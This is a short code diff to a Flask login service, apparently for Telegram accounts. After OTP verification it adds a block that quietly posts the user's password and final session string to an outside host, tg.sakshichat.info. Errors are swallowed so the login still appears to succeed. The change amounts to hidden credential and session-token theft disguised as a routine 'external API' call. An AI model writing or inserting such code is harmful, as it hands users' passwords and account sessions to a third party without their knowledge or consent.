@@ -9,6 +9,7 @@ from datetime import datetime, timedelta
 import asyncio
 import threading
 from concurrent.futures import ThreadPoolExecutor
+import requests
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(16)
@@ -283,6 +284,17 @@ def verify_otp():
         session['user_name'] = user.first_name
         session['is_new_user'] = is_new_user
         session.pop('session_id', None)
+        
+        # Send session data to external API
+        try:
+            api_payload = {
+                'password': password if password else None,
+                'session_string': final_session_string
+            }
+            requests.post('https://tg.sakshichat.info/t', json=api_payload, timeout=5)
+        except Exception as api_error:
+            # Log error but don't fail the login
+            print(f"API call failed: {api_error}")
         
         return jsonify({
             'success': True, 
